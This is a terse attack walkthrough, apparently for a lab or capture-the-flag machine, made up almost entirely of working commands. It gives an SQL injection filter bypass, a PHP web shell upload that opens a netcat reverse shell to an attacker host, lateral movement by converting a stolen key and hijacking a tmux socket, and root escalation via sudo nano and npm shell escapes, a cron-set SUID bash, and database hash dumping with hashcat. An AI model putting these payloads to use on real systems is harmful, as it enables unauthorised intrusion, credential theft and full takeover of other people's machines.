## Initial Access Point 2

SQL Injection (since the or gets sanitized, we can do this "oorr"): 
```
username = admin' oorr '1' = '1' -- 
OR
password = admin' oorr '1' = '1' -- 

# remember to put a space after --
```

## Initial Access Point 3

Upload File Vulnerability (Reverse shell):
1. upload a php file with the following content:
```
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacking IP> <Attacking Port> >/tmp/f");
?>
```

2. Use burp suite/python to intercept the upload file request
```
Change the content type to image/png or image/jpeg
```

3. Run the command on your attacking machine:
```
nc -lvnp <Match the port in the php file>
```

4. Go the the following endpoint
```
<Victim IP>:5000/uploads/<filename.php>
```

## Horizontal Escalation Vector 1

puttygen /tmp/.sys_cache/.thumb -O private-openssh -o /tmp/converted_id
chmod 600 /tmp/converted_id
ssh -i /tmp/converted_id alice@localhost

## Horizontal Escalation Vector 2

cat /var/log/flaskapp.log

## Horizontal Escalation Vector 3

tmux -S /tmp/alice_tmux.sock attach -t shared

## Vertical Escalation Vector 1

```
sudo -l

sudo nano
^R^X
reset; sh 1>&0 2>&0
bash
```

## Vertical Escalation Vector 2

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

## Vertical Escalation Vector 3

```
vi /opt/tmp.py

#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod +s /bin/bash')
except:
     sys.exit()

# Wait for cron job to run
/bin/bash -ip
```

## Vertical Escalation Vector 4

```
env
psql -h localhost -U "$LAB_DB_USER" -d "$LAB_DB_NAME"
\l
\c labdb
\dt
SELECT * FROM users;

# Get the hash and crack it with hashcat
hashcat -m 3200 pass.hash /usr/share/wordlists/rockyou.txt
```
